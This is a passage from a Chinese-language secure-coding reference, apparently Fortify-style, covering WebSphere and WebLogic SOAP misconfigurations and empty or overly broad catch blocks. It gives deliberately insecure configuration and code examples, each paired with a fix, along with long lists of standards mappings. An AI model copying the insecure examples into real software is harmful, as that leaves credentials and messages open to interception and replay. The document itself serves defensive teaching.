<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000180 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000180 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000180 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[24] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authentication</p>
<p>[25] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Transport Layer Protection (WASC-04)</p>
<h4 id="WebSphere-Service-Requester-Misconfiguration-Weak-Token"><a href="#WebSphere-Service-Requester-Misconfiguration-Weak-Token" class="headerlink" title="WebSphere Service Requester Misconfiguration: Weak Token"></a>WebSphere Service Requester Misconfiguration: Weak Token</h4><h5 id="ABSTRACT-240"><a href="#ABSTRACT-240" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>若在未经加密的通道上使用 UsernameToken 及明文密码，则可截取 SOAP 消息的攻击者会趁机获取该密码。</p>
<h5 id="EXPLANATION-241"><a href="#EXPLANATION-241" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>若通过未经加密的通道发送明文密码，则可截取 SOAP 消息的攻击者会趁机获取凭证。</p>
<p>下列 WebSphere 客户端配置使用了此 UsernameToken：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;com.ibm.etools.webservice.wscext:WsClientExtension xmi:version=&quot;2.0&quot; xmlns:xmi=&quot;http://www.omg.org/XMI&quot; xmlns:com.ibm.etools.webservice.wscext=&quot;http://www.ibm.com/websphere/appserver/schemas/5.0.2/wscext.xmi&quot; xmi:id=&quot;WsClientExtension_1151349988084&quot;&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">        &lt;securityRequestGeneratorServiceConfig xmi:id=&quot;SecurityRequestGeneratorServiceConfig_1154318832968&quot;&gt;</span><br><span class="line"></span><br><span class="line">          &lt;securityToken xmi:id=&quot;SecurityToken_1211395747219&quot; name=&quot;basicauth&quot; uri=&quot;&quot; localName=&quot;http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#UsernameToken&quot;/&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&lt;/com.ibm.etools.webservice.wscext:WsClientExtension&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-240"><a href="#RECOMMENDATIONS-240" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>如果服务提供程序提供支持，则使用签名而非 UsernameToken。下面提供了一个配置示例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;com.ibm.etools.webservice.wscext:WsClientExtension xmi:version=&quot;2.0&quot; xmlns:xmi=&quot;http://www.omg.org/XMI&quot; xmlns:com.ibm.etools.webservice.wscext=&quot;http://www.ibm.com/websphere/appserver/schemas/5.0.2/wscext.xmi&quot; xmi:id=&quot;WsClientExtension_1152150778436&quot;&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">        &lt;securityRequestGeneratorServiceConfig xmi:id=&quot;SecurityRequestGeneratorServiceConfig_1211566642828&quot;&gt;</span><br><span class="line"></span><br><span class="line">          &lt;securityToken xmi:id=&quot;SecurityToken_1213868348215&quot; name=&quot;unt&quot; uri=&quot;&quot; localName=&quot;http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-x509-token-profile-1.0#X509v3&quot;/&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&lt;/com.ibm.etools.webservice.wscext:WsClientExtension&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-239"><a href="#REFERENCES-239" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Web Services Security: SOAP Message Security 1.1 OASIS</p>
<p>[2] Web Services Security Username Token Profile 1.0 OASIS</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 254</p>
<p>[4] Standards Mapping - FIPS200 MP</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1)</p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M3 Insufficient Transport Layer Protection</p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A8 Insecure Storage</p>
<p>[8] Standards Mapping - OWASP Top 10 2007 A8 Insecure Cryptographic Storage</p>
<p>[9] Standards Mapping - OWASP Top 10 2010 A7 Insecure Cryptographic Storage</p>
<p>[10] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 4.1, Requirement 6.5.8, Requirement 8.4</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 4.1, Requirement 6.3.1.3, Requirement 6.5.8, Requirement 8.4</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 4.1, Requirement 6.5.3, Requirement 8.4</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 4.1, Requirement 6.5.4, Requirement 8.2.1</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 4.1, Requirement 6.5.4, Requirement 8.2.1</p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 4.1, Requirement 6.5.4, Requirement 8.2.1</p>
<p>[17] Standards Mapping - SANS Top 25 2010 Porous Defenses - CWE ID 311</p>
<p>[18] Standards Mapping - SANS Top 25 2011 Porous Defenses - CWE ID 311</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I, APP3260.1 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I, APP3260 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I, APP3260 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I, APP3260 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I, APP3260 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I, APP3260 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I, APP3260 CAT II</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000220 CAT II, APSC-DV-001750 CAT I, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000220 CAT II, APSC-DV-001750 CAT I, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000220 CAT II, APSC-DV-001750 CAT I, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[29] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authentication</p>
<p>[30] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Transport Layer Protection (WASC-04)</p>
<h4 id="Weblogic-Misconfiguration-Missing-Timestamp"><a href="#Weblogic-Misconfiguration-Missing-Timestamp" class="headerlink" title="Weblogic Misconfiguration: Missing Timestamp"></a>Weblogic Misconfiguration: Missing Timestamp</h4><h5 id="ABSTRACT-241"><a href="#ABSTRACT-241" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>若缺少时间戳，会导致 SOAP 消息遭受 replay 攻击。</p>
<h5 id="EXPLANATION-242"><a href="#EXPLANATION-242" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>安全性时间戳可表明消息安全数据的“新鲜性”。如果攻击者截取了一则消息，稍后将其转发，则接收者能够拒绝此 replay 攻击，因为时间戳会指明该消息已过期。</p>
<p>为避免攻击者篡改时间戳，应对时间戳执行签名。如果 SOAP 消息的时间戳未经签名，则攻击者可在接收者不知情的情况下截取该消息、修改时间戳，以及转发该消息。在这种情况下，攻击者会欺骗接收者接受恶意消息。</p>
<p>例 1：以下策略条目中的 <code>&lt;MessageAge&gt;</code> 标签已被注释掉。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;wsp:Policy</span><br><span class="line"></span><br><span class="line">  xmlns:wsp=&quot;http://schemas.xmlsoap.org/ws/2004/09/policy&quot;</span><br><span class="line"></span><br><span class="line">  xmlns:wssp=&quot;http://www.bea.com/wls90/security/policy&quot;</span><br><span class="line"></span><br><span class="line">  xmlns:wsu=&quot;http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd&quot;</span><br><span class="line"></span><br><span class="line">  &gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&lt;!--   &lt;wssp:MessageAge/&gt; --&gt;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">&lt;/wsp:Policy&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-241"><a href="#RECOMMENDATIONS-241" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>将服务配置为在 SOAP 消息中发送时间戳。 例 2：以下策略条目包含 <messageage> 标签，因此时间戳也会包含在 SOAP 消息中。</messageage></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;wsp:Policy</span><br><span class="line"></span><br><span class="line">  xmlns:wsp=&quot;http://schemas.xmlsoap.org/ws/2004/09/policy&quot;</span><br><span class="line"></span><br><span class="line">  xmlns:wssp=&quot;http://www.bea.com/wls90/security/policy&quot;</span><br><span class="line"></span><br><span class="line">  xmlns:wsu=&quot;http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd&quot;</span><br><span class="line"></span><br><span class="line">  &gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">   &lt;wssp:MessageAge/&gt;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">&lt;/wsp:Policy&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-240"><a href="#REFERENCES-240" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Security Policy Assertion Reference BEA</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 254</p>
<p>[3] Standards Mapping - FIPS200 CM</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M3 Insufficient Transport Layer Protection</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[7] Standards Mapping - OWASP Top 10 2007 A9 Insecure Communications</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A9 Insufficient Transport Layer Protection</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 4.1, Requirement 6.5.10</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 4.1, Requirement 6.5.4</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 4.1, Requirement 6.5.4</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 4.1, Requirement 6.5.4</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 4.1, Requirement 6.5.4</p>
<p>[16] Standards Mapping - SANS Top 25 2010 Porous Defenses - CWE ID 311</p>
<p>[17] Standards Mapping - SANS Top 25 2011 Porous Defenses - CWE ID 311</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3260.1 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3870 CAT I, APP3260 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3870 CAT I, APP3260 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3870 CAT I, APP3260 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3870 CAT I, APP3260 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3870 CAT I, APP3260 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3870 CAT I, APP3260 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000180 CAT II, APSC-DV-000190 CAT I, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000180 CAT II, APSC-DV-000190 CAT I, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000180 CAT II, APSC-DV-000190 CAT I, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[28] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authentication</p>
<p>[29] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Transport Layer Protection (WASC-04)</p>
<h4 id="Weblogic-Misconfiguration-Weak-Token"><a href="#Weblogic-Misconfiguration-Weak-Token" class="headerlink" title="Weblogic Misconfiguration: Weak Token"></a>Weblogic Misconfiguration: Weak Token</h4><h5 id="ABSTRACT-242"><a href="#ABSTRACT-242" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>若在未经加密的通道上使用 UsernameToken 及明文密码，则可截取 SOAP 消息的攻击者会趁机获取该密码。</p>
<h5 id="EXPLANATION-243"><a href="#EXPLANATION-243" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>若通过未经加密的通道发送明文密码，则可截取 SOAP 消息的攻击者会趁机获取凭证。</p>
<p>例 1：以下策略条目使用 UsernameToken。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;wssp:SupportedTokens&gt;</span><br><span class="line"></span><br><span class="line">    &lt;wssp:SecurityToken TokenType=&quot;http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#UsernameToken&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;/wssp:SupportedTokens&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-242"><a href="#RECOMMENDATIONS-242" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>要求使用签名，而不是 UsernameToken。</p>
<p>例 2：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;wssp:SupportedTokens&gt;</span><br><span class="line"></span><br><span class="line">    &lt;wssp:SecurityToken TokenType=&quot;http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-x509-token-profile-1.0#X509v3&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;/wssp:SupportedTokens&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-241"><a href="#REFERENCES-241" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Web Services Security: SOAP Message Security 1.1 OASIS</p>
<p>[2] Web Services Security Username Token Profile 1.0 OASIS</p>
<p>[3] Security Policy Assertion Reference BEA</p>
<p>[4] Standards Mapping - Common Weakness Enumeration CWE ID 254</p>
<p>[5] Standards Mapping - FIPS200 CM, SC</p>
<p>[6] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1)</p>
<p>[7] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M3 Insufficient Transport Layer Protection</p>
<p>[8] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[9] Standards Mapping - OWASP Top 10 2007 A9 Insecure Communications</p>
<p>[10] Standards Mapping - OWASP Top 10 2010 A9 Insufficient Transport Layer Protection</p>
<p>[11] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 4.1, Requirement 6.5.10</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 4.1, Requirement 6.5.4</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 4.1, Requirement 6.5.4</p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 4.1, Requirement 6.5.4</p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 4.1, Requirement 6.5.4</p>
<p>[18] Standards Mapping - SANS Top 25 2010 Porous Defenses - CWE ID 311</p>
<p>[19] Standards Mapping - SANS Top 25 2011 Porous Defenses - CWE ID 311</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260.1 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000220 CAT II, APSC-DV-001750 CAT I, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000220 CAT II, APSC-DV-001750 CAT I, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000220 CAT II, APSC-DV-001750 CAT I, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[30] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authentication</p>
<p>[31] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Transport Layer Protection (WASC-04)</p>
<h3 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h3><p>错误和错误处理代表 API 的一个类。与错误处理相关的错误十分常见，它们单独需要一个特殊的界。对于“API 滥用”，有两种方式可以引入与错误相关的安全漏洞：最常用的方式是不当处理错误（或根本不处理）。第二种方式是制造提供太多信息（给潜在的攻击者）或难以处理的错误。</p>
<p>Poor Error Handling: Empty Catch Block</p>
<p>Poor Error Handling: Overly Broad Catch</p>
<p>Poor Error Handling: Overly Broad Throws</p>
<p>Poor Error Handling: Program Catches NullPointerException</p>
<p>Poor Error Handling: Return Inside Finally</p>
<p>Poor Error Handling: Swallowed ThreadDeath</p>
<p>Poor Error Handling: Throw Inside Finally</p>
<p>Poor Error Handling: Unhandled SSL Exception</p>
<h4 id="Poor-Error-Handling-Empty-Catch-Block"><a href="#Poor-Error-Handling-Empty-Catch-Block" class="headerlink" title="Poor Error Handling: Empty Catch Block"></a>Poor Error Handling: Empty Catch Block</h4><h5 id="ABSTRACT-243"><a href="#ABSTRACT-243" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>忽略异常会导致程序无法发现意外状况和情况。</p>
<h5 id="EXPLANATION-244"><a href="#EXPLANATION-244" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>几乎每一个对软件系统的严重攻击都是从违反程序员的假设开始的。攻击后，程序员的假设看起来既脆弱又拙劣，但攻击前，许多程序员会在午休时间为自己的种种假设做很好的辩护。</p>
<p>在代码中，很容易发现两个令人怀疑的假设：“一是这个方法调用不可能出错；二是即使出错了，也不会对系统造成什么重要影响。”因此当程序员忽略异常时，这其实就表明了他们是基于上述假设进行的操作。</p>
<p>例 1：下面摘录的代码会忽略一个由 doExchange() 抛出的罕见异常。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line"></span><br><span class="line">  doExchange();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">catch (RareException e) &#123;</span><br><span class="line"></span><br><span class="line">  // this can never happen</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果抛出 RareException 异常，程序会继续执行，就像什么都没有发生一样。程序不会记录任何有关这一特殊情况的依据，因而事后再查找这一异常就可能很困难。</p>
<h5 id="RECOMMENDATIONS-243"><a href="#RECOMMENDATIONS-243" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>至少，应该记录抛出异常的事实，以便于稍后查询及预知对程序运行所造成的影响。然而最好是中止当前操作。如果忽略某个异常的原因是因为调用者无法正确处理该异常，而程序上下文使调用者不便或不可能声明程序会抛出这一异常，那么可以考虑抛出 RuntimeException 或 Error 异常，两者均是未检查的异常。在 JDK 1.4 中，RuntimeException 有一个构造函数，可以方便地用来封装另其他异常。</p>
<p>例 2： 例 1 中的代码应该用以下方式重写：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line"></span><br><span class="line">  doExchange();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">catch (RareException e) &#123;</span><br><span class="line"></span><br><span class="line">  throw new RuntimeException(&quot;This can never happen&quot;, e);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-242"><a href="#REFERENCES-242" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] ERR00-J. Do not suppress or ignore checked exceptions CERT</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 391</p>
<p>[3] Standards Mapping - FIPS200 AU</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-11 Error Handling (P2)</p>
<p>[5] Standards Mapping - OWASP Top 10 2004 A7 Improper Error Handling</p>
<p>[6] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling</p>
<p>[7] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.7</p>
<p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.2, Requirement 6.5.6</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.5</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.5</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.5</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.5</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3120 CAT II</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3120 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3120 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3120 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3120 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3120 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3120 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<h4 id="Poor-Error-Handling-Overly-Broad-Catch"><a href="#Poor-Error-Handling-Overly-Broad-Catch" class="headerlink" title="Poor Error Handling: Overly Broad Catch"></a>Poor Error Handling: Overly Broad Catch</h4><h5 id="ABSTRACT-244"><a href="#ABSTRACT-244" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>catch 块可以处理的异常种类很多，但往往会由于过多的考虑不应该在此位置处理的各种问题或故障而困扰不已。</p>
